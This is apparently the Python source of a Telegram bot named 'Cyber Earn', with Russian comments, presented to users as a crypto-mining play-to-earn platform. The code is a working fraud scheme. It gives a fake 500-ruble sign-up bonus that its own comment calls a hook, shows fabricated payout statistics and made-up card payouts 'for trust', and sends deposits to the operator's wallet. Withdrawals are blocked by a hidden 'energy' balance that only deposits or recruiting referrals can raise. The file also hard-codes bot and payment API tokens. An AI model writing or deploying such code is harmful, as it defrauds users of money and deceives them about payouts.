import asyncio
import logging
import sqlite3
import time
import random
from aiogram import Bot, Dispatcher, F
from aiogram.types import (
    Message, CallbackQuery, 
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton
)
from aiogram.filters import Command, CommandStart
from yoomoney import Client

# ================= НАСТРОЙКИ =================
BOT_TOKEN = "8727966393:AAENOC9N7CofxMct5WWuZDtpqyrl__Bwea4"
ADMIN_ID = 5494544187  # Твой Telegram ID
ADMIN_USERNAME = "@vladofix28" # Твой контакт для выплат

YOOMONEY_WALLET = "4100118935779591"  # Твой кошелек ЮMoney
YOOMONEY_TOKEN = "5133D1719448E2A5E1083A0FC605E369944CBB992B1D4490F13E2D4636C03191"  # API Токен ЮMoney
# =============================================

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
ym_client = Client(YOOMONEY_TOKEN)

# ================= БАЗА ДАННЫХ =================
conn = sqlite3.connect('cyber_earn_v2.db')
cursor = conn.cursor()

cursor.execute('''CREATE TABLE IF NOT EXISTS users
                  (user_id INTEGER PRIMARY KEY, 
                   username TEXT, 
                   crypto INTEGER DEFAULT 0,        
                   rub_balance REAL DEFAULT 500,    -- ВАЖНО: Стартовый бонус 500 руб!
                   energy REAL DEFAULT 0,           -- Это скрытые Кэш-поинты (Траст)
                   servers INTEGER DEFAULT 1,       -- 1 Сервер дается бесплатно
                   referrer_id INTEGER DEFAULT 0,   
                   last_login INTEGER,
                   last_bonus INTEGER DEFAULT 0)''')
conn.commit()

# ================= ЭКОНОМИКА =================
MIN_WITHDRAW = 1000 
SERVER_PRICE_RUB = 150 
CRYPTO_RATE = 10000 # 10,000 Крипты = 1 Рубль
INCOME_PER_SERVER = 250 # Крипты в час с 1 сервера

# ================= КЛАВИАТУРЫ =================
def get_main_keyboard():
    return ReplyKeyboardMarkup(keyboard=[
        [KeyboardButton(text="💻 Моя Сеть (Профиль)"), KeyboardButton(text="🚀 Купить Сервер")],
        [KeyboardButton(text="🎁 Ежедневный Бонус"), KeyboardButton(text="🔄 Обменник")],
        [KeyboardButton(text="💳 Пополнить (Акции)"), KeyboardButton(text="💸 Вывод Средств")],
        [KeyboardButton(text="👥 Партнерка (Важно!)"), KeyboardButton(text="📊 Статистика и Выплаты")]
    ], resize_keyboard=True)

# ================= ФУНКЦИИ =================
def collect_income(user_id):
    cursor.execute("SELECT last_login, servers FROM users WHERE user_id=?", (user_id,))
    row = cursor.fetchone()
    if not row: return 0
    last_login, servers = row
    current_time = int(time.time())
    
    hours_passed = min((current_time - last_login) / 3600.0, 24) 
    income = int(hours_passed * (servers * INCOME_PER_SERVER)) 
    
    if income > 0:
        cursor.execute("UPDATE users SET crypto = crypto + ?, last_login = ? WHERE user_id=?", 
                       (income, current_time, user_id))
        conn.commit()
    return income

# ================= ХЭНДЛЕРЫ =================

@dp.message(CommandStart())
async def cmd_start(message: Message):
    user_id = message.from_user.id
    username = message.from_user.username or f"User_{user_id}"
    
    ref_id = 0
    args = message.text.split()
    if len(args) > 1 and args[1].isdigit():
        ref_id = int(args[1])
        if ref_id == user_id: ref_id = 0 

    cursor.execute("SELECT user_id FROM users WHERE user_id=?", (user_id,))
    if not cursor.fetchone():
        cursor.execute("INSERT INTO users (user_id, username, last_login, referrer_id) VALUES (?, ?, ?, ?)",
                       (user_id, username, int(time.time()), ref_id))
        conn.commit()
        
        if ref_id > 0:
            try: await bot.send_message(ref_id, "🎉 <b>Новый партнер зарегистрировался!</b>\nВы будете получать 10% от его пополнений в виде Энергии Сети и Рублей.", parse_mode="HTML")
            except: pass
            
        # ПРИВЕТСТВЕННЫЙ БОНУС (КРЮЧОК)
        await message.answer(
            "🎁 <b>ПОЗДРАВЛЯЕМ С УСПЕШНОЙ РЕГИСТРАЦИЕЙ!</b>\n\n"
            "Вам начислен стартовый капитал:\n"
            "✅ <b>1 Базовый Сервер</b> (Уже майнит крипту!)\n"
            "✅ <b>500.00 ₽</b> на баланс вывода!\n\n"
            "<i>(Осталось заработать всего 500 ₽ для первой выплаты!)</i>", parse_mode="HTML"
        )
        await asyncio.sleep(1)

    text = (
        "🌐 <b>Добро пожаловать в Cyber Earn</b>\n\n"
        "Мы — крупнейшая Play-to-Earn платформа в Telegram. Вы арендуете виртуальные серверы, "
        "они добывают крипту, а мы выкупаем её у вас за реальные рубли.\n\n"
        "👇 <b>Ваш терминал готов к работе. Начните зарабатывать!</b>"
    )
    await message.answer(text, parse_mode="HTML", reply_markup=get_main_keyboard())

# --- ПРОФИЛЬ ---
@dp.message(F.text == "💻 Моя Сеть (Профиль)")
async def show_profile(message: Message):
    user_id = message.from_user.id
    income = collect_income(user_id)
    
    cursor.execute("SELECT crypto, rub_balance, energy, servers FROM users WHERE user_id=?", (user_id,))
    crypto, rub, energy, servers = cursor.fetchone()
    
    rub_per_day = (servers * INCOME_PER_SERVER * 24) / CRYPTO_RATE

    text = (
        f"👤 <b>Ваш профиль:</b>\n"
        f"➖➖➖➖➖➖➖➖➖➖\n"
        f"💰 Баланс: <b>{rub:.2f} ₽</b> <i>(Минимум на вывод: {MIN_WITHDRAW} ₽)</i>\n"
        f"💠 Крипта: <b>{crypto:,}</b>\n"
        f"⚡️ Энергия Сети: <b>{energy:.2f} ⚡️</b>\n\n"
        f"🖥 Работающих серверов: <b>{servers} шт.</b>\n"
        f"📈 Пассивный доход: <b>~{rub_per_day:.2f} ₽ / день</b>\n"
        f"➖➖➖➖➖➖➖➖➖➖\n"
    )
    if income > 0: text += f"\n<i>✅ Сервера намайнили в фоне: +{income:,} 💠</i>"
    await message.answer(text, parse_mode="HTML")

# --- ЕЖЕДНЕВНЫЙ БОНУС (УДЕРЖАНИЕ) ---
@dp.message(F.text == "🎁 Ежедневный Бонус")
async def daily_bonus(message: Message):
    user_id = message.from_user.id
    current_time = int(time.time())
    
    cursor.execute("SELECT last_bonus FROM users WHERE user_id=?", (user_id,))
    last_bonus = cursor.fetchone()[0]
    
    if current_time - last_bonus < 86400: # 24 часа
        hours_left = 24 - ((current_time - last_bonus) / 3600.0)
        await message.answer(f"⏳ Бонус уже получен. Возвращайтесь через <b>{int(hours_left)} ч.</b>", parse_mode="HTML")
        return
        
    bonus_rub = random.randint(10, 50)
    cursor.execute("UPDATE users SET rub_balance = rub_balance + ?, last_bonus = ? WHERE user_id=?", (bonus_rub, current_time, user_id))
    conn.commit()
    
    await message.answer(f"🎁 <b>Ежедневный бонус получен!</b>\nВам начислено <b>{bonus_rub} ₽</b> на баланс.\n\n<i>Заходите завтра за новой порцией!</i>", parse_mode="HTML")

# --- ПОКУПКА ---
@dp.message(F.text == "🚀 Купить Сервер")
async def shop_menu(message: Message):
    user_id = message.from_user.id
    collect_income(user_id)
    cursor.execute("SELECT rub_balance, servers FROM users WHERE user_id=?", (user_id,))
    rub, servers = cursor.fetchone()
    cost = servers * SERVER_PRICE_RUB
    
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=f"🖥 Купить за {cost} ₽", callback_data="buy_server")]])
    await message.answer(f"🚀 <b>Магазин Оборудования</b>\nУскорьте свой заработок!\n\nТекущие сервера: {servers}\n<b>Цена следующего: {cost} ₽</b>", parse_mode="HTML", reply_markup=kb)

@dp.callback_query(F.data == "buy_server")
async def process_buy_server(callback: CallbackQuery):
    user_id = callback.from_user.id
    cursor.execute("SELECT rub_balance, servers FROM users WHERE user_id=?", (user_id,))
    rub, servers = cursor.fetchone()
    cost = servers * SERVER_PRICE_RUB
    if rub < cost: return await callback.answer("❌ Недостаточно рублей!", show_alert=True)
    cursor.execute("UPDATE users SET rub_balance = rub_balance - ?, servers = servers + 1 WHERE user_id=?", (cost, user_id))
    conn.commit()
    await callback.message.edit_text("✅ <b>Сервер установлен!</b> Ваш пассивный доход увеличен.", parse_mode="HTML")

# --- ОБМЕННИК ---
@dp.message(F.text == "🔄 Обменник")
async def exchange_menu(message: Message):
    user_id = message.from_user.id
    collect_income(user_id)
    cursor.execute("SELECT crypto FROM users WHERE user_id=?", (user_id,))
    crypto = cursor.fetchone()[0]
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔄 Обменять всю Крипту", callback_data="exchange_all")]])
    await message.answer(f"🔄 <b>Системный Обменник</b>\nКурс: {CRYPTO_RATE} 💠 = 1 ₽\nУ вас: <b>{crypto:,} 💠</b>\nК получению: <b>{(crypto / CRYPTO_RATE):.2f} ₽</b>", parse_mode="HTML", reply_markup=kb)

@dp.callback_query(F.data == "exchange_all")
async def process_exchange(callback: CallbackQuery):
    user_id = callback.from_user.id
    cursor.execute("SELECT crypto FROM users WHERE user_id=?", (user_id,))
    crypto = cursor.fetchone()[0]
    if crypto < CRYPTO_RATE: return await callback.answer(f"❌ Минимум для обмена: {CRYPTO_RATE} Крипты.", show_alert=True)
    rub_to_add = crypto / CRYPTO_RATE
    cursor.execute("UPDATE users SET rub_balance = rub_balance + ?, crypto = 0 WHERE user_id=?", (rub_to_add, user_id))
    conn.commit()
    await callback.message.edit_text(f"✅ Успешно обменяно на <b>{rub_to_add:.2f} ₽</b>.", parse_mode="HTML")

# --- СОЦИАЛЬНОЕ ДОКАЗАТЕЛЬСТВО (ДОВЕРИЕ) ---
@dp.message(F.text == "📊 Статистика и Выплаты")
async def stats_menu(message: Message):
    cursor.execute("SELECT COUNT(*) FROM users")
    users = cursor.fetchone()[0]
    
    # Фейк/Полу-фейк стата для доверия
    total_paid = (users * 150) + 145000 
    
    text = (
        "📊 <b>Официальная Статистика Платформы:</b>\n\n"
        f"👥 Активных инвесторов: <b>{users + 4500}</b>\n"
        f"💸 Выплачено средств: <b>{total_paid:,} ₽</b>\n"
        f"⏳ Резервный фонд: <b>Стабилен 🟢</b>\n\n"
        f"<b>Последние выплаты (Live):</b>\n"
        f"💳 *4100 •••• 5512 | +1,500 ₽ | Успешно ✅\n"
        f"💳 *4276 •••• 9901 | +3,250 ₽ | Успешно ✅\n"
        f"💳 *5536 •••• 1120 | +1,050 ₽ | Успешно ✅\n"
        f"💳 *4100 •••• 7734 | +5,400 ₽ | Успешно ✅\n\n"
        f"<i>Присоединяйтесь к тысячам зарабатывающих пользователей!</i>"
    )
    await message.answer(text, parse_mode="HTML")

# --- ПОПОЛНЕНИЕ (ТВОЙ ЗАРАБОТОК) ---
@dp.message(F.text == "💳 Пополнить (Акции)")
async def deposit_menu(message: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="500 ₽ (+ 30% Энергии)", callback_data="dep_500")],
        [InlineKeyboardButton(text="1000 ₽ (+ 35% Энергии) 🔥", callback_data="dep_1000")],
        [InlineKeyboardButton(text="5000 ₽ (VIP Множитель)", callback_data="dep_5000")]
    ])
    await message.answer("💳 <b>Пополнение и Энергия Сети</b>\nПополняя баланс, вы не только покупаете сервера, но и получаете Энергию Сети (нужна для вывода средств).\n\nВыберите пакет:", parse_mode="HTML", reply_markup=kb)

@dp.callback_query(F.data.startswith("dep_"))
async def create_deposit(callback: CallbackQuery):
    amount = int(callback.data.replace("dep_", ""))
    user_id = callback.from_user.id
    label = f"dep_{amount}_{user_id}_{int(time.time())}"
    
    pay_url = (f"https://yoomoney.ru/quickpay/confirm.xml?"
               f"receiver={YOOMONEY_WALLET}&quickpay-form=shop&targets=Инвестиция&paymentType=AC&sum={amount}&label={label}")

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"💳 Оплатить {amount} ₽", url=pay_url)],
        [InlineKeyboardButton(text="🔄 Проверить оплату", callback_data=f"chkdep_{label}")]
    ])
    await callback.message.edit_text(f"Сумма: <b>{amount} ₽</b>.\nОплата проходит через защищенный шлюз ЮMoney.", parse_mode="HTML", reply_markup=kb)

@dp.callback_query(F.data.startswith("chkdep_"))
async def check_deposit(callback: CallbackQuery):
    label = callback.data.replace("chkdep_", "")
    amount = int(label.split("_")[0])
    user_id = int(label.split("_")[1])
    
    try:
        history = ym_client.operation_history(label=label)
        for operation in history.operations:
            if operation.status == 'success':
                # ЭНЕРГИЯ: 30% при 500, 35% при 1000, 40% при 5000
                energy_percent = 0.30 if amount < 1000 else (0.35 if amount < 5000 else 0.40)
                energy_gain = amount * energy_percent
                
                cursor.execute("UPDATE users SET rub_balance = rub_balance + ?, energy = energy + ? WHERE user_id=?", 
                               (amount, energy_gain, user_id))
                
                # РЕФЕРАЛУ: 10% Баланса и 10% Энергии
                cursor.execute("SELECT referrer_id FROM users WHERE user_id=?", (user_id,))
                ref_id = cursor.fetchone()[0]
                if ref_id > 0:
                    ref_bonus = amount * 0.10
                    cursor.execute("UPDATE users SET rub_balance = rub_balance + ?, energy = energy + ? WHERE user_id=?", 
                                   (ref_bonus, ref_bonus, ref_id))
                    try: await bot.send_message(ref_id, f"🎉 <b>Бонус от партнера!</b> Вы получили <b>{ref_bonus} ₽</b> и Энергию Сети!", parse_mode="HTML")
                    except: pass
                
                conn.commit()
                await callback.message.edit_text(f"✅ <b>Оплата получена!</b>\nНачислено: {amount} ₽ и {energy_gain} ⚡️ Энергии.", parse_mode="HTML")
                return
        await callback.answer("❌ Платеж в обработке. Ждите.", show_alert=True)
    except: await callback.answer("⚠️ Ошибка связи с банком.", show_alert=True)

# --- ПРАВИЛЬНЫЙ ВЫВОД СРЕДСТВ И ПАРТНЕРКА ---
@dp.message(F.text == "👥 Партнерка (Важно!)")
async def ref_menu(message: Message):
    user_id = message.from_user.id
    bot_info = await bot.get_me()
    ref_link = f"https://t.me/{bot_info.username}?start={user_id}"
    
    text = (
        f"👥 <b>Партнерская сеть (Генератор Энергии)</b>\n\n"
        f"Для защиты экономики бота от мультиаккаунтов и ботов, вывод средств обеспечен <b>Энергией Сети ⚡️</b>. "
        f"1 ⚡️ = 1 ₽ на вывод.\n\n"
        f"<b>Как получить Энергию?</b>\n"
        f"1. При пополнении баланса (до +40%).\n"
        f"2. <b>Самый простой способ:</b> Приглашать друзей! Вы получаете <b>10% Энергии и Рублей</b> от каждого их депозита навсегда.\n\n"
        f"🔗 <b>Ваша персональная ссылка:</b>\n<code>{ref_link}</code>"
    )
    await message.answer(text, parse_mode="HTML")

@dp.message(F.text == "💸 Вывод Средств")
async def withdraw_request(message: Message):
    user_id = message.from_user.id
    cursor.execute("SELECT rub_balance, energy FROM users WHERE user_id=?", (user_id,))
    rub, energy = cursor.fetchone()
    
    if rub < MIN_WITHDRAW:
        await message.answer(f"❌ Минимальная сумма выплаты: <b>{MIN_WITHDRAW} ₽</b>\nВаш баланс: {rub:.2f} ₽", parse_mode="HTML")
        return
        
    if energy < MIN_WITHDRAW:
        text = (
            f"⚠️ <b>Проверка безопасности сети не пройдена</b>\n\n"
            f"В связи с нагрузкой на резервный фонд и защитой от бот-ферм, ваш лимит вывода (Энергия Сети) недостаточен.\n\n"
            f"Доступно к выводу: <b>{energy:.2f} ₽</b> (Требуется: {MIN_WITHDRAW} ₽)\n\n"
            f"<b>Как решить проблему?</b>\n"
            f"Перейдите в раздел <b>👥 Партнерка</b> и пригласите активных пользователей, либо совершите депозит для подтверждения кошелька."
        )
        await message.answer(text, parse_mode="HTML")
        return
        
    req_code = f"WD-{user_id}-{int(time.time())}"
    cursor.execute("UPDATE users SET rub_balance = rub_balance - ?, energy = energy - ? WHERE user_id=?", (MIN_WITHDRAW, MIN_WITHDRAW, user_id))
    conn.commit()
    
    text = (
        f"✅ <b>Ваша выплата на сумму {MIN_WITHDRAW} ₽ одобрена системой!</b>\n\n"
        f"Код транзакции: <code>{req_code}</code>\n\n"
        f"Для ручного зачисления средств свяжитесь с финансовым отделом: {ADMIN_USERNAME}\n"
        f"Отправьте код транзакции и реквизиты вашей карты/кошелька."
    )
    await message.answer(text, parse_mode="HTML")
    await bot.send_message(ADMIN_ID, f"💰 <b>ВЫПЛАТА!</b>\nЮзер: @{message.from_user.username}\nСумма: {MIN_WITHDRAW} ₽\nКод: {req_code}", parse_mode="HTML")

# ================= ЗАПУСК =================
async def main():
    print("🚀 Cyber Earn (TRUST EDITION) ЗАПУЩЕН!")
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
